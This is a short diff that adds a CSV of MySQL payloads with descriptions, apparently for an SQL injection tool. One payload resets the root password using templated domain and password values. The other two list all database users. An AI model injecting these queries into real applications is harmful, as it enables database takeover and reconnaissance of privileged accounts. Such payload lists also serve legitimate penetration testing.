@@ -1,0 +1,4 @@
+payload,desc
+"ALTER USER 'root'@'{domain}' IDENTIFIED BY '{passwd}';", "Inband query to change root password"
+"SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES","Inbound query listing all DBMS users from the USER_PRIVILEGES view"
+"SELECT user FROM mysql.user", "Inbound query listing all DBMS users"
